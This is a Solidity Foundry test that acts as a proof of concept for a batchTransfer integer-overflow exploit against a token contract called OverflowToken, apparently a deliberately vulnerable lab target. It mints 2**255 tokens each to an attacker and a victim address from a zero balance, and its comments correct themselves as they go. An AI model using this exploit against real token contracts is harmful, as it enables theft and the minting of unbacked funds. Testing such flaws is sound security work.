// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {OverflowToken} from "../src/OverflowToken.sol";

contract OverflowTokenTest is Test {
    OverflowToken token;
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new OverflowToken();
        // Attacker starts with 0 balance (creator has 1M tokens)
    }

    function test_batch_overflow() public {
        // Attacker calls batchTransfer with value = 2**255 and two recipients
        // amount = 2 * 2**255 = 2**256 ≡ 0 (mod 2**256)
        // require(value > 0 && balanceOf[msg.sender] >= amount) passes (amount = 0)
        // Each recipient gets 2**255 tokens
        uint256 value = 2**255;
        address[] memory recipients = new address[](2);
        recipients[0] = attacker;
        recipients[1] = attacker; // same attacker gets both
        
        // Give attacker some tokens to satisfy the (broken) check
        // Actually require(balanceOf[msg.sender] >= amount) with amount=0 passes always
        // No need to fund attacker
        
        // Call batchTransfer as attacker
        vm.prank(attacker);
        token.batchTransfer(recipients, value);
        
        // Attacker should have received 2 * 2**255 = 2**256 ≡ 0? 
        // Actually balanceOf[attacker] += value TWICE = 2**255 + 2**255 = 2**256 ≡ 0
        // So use two DIFFERENT recipients
        address victim = makeAddr("victim");
        recipients[1] = victim;
        
        vm.prank(attacker);
        token.batchTransfer(recipients, value);
        
        // Attacker should have 2**255 tokens
        assertEq(token.balanceOf(attacker), 2**255, "Overflow failed");
        assertEq(token.balanceOf(victim), 2**255, "Victim not minted");
    }
}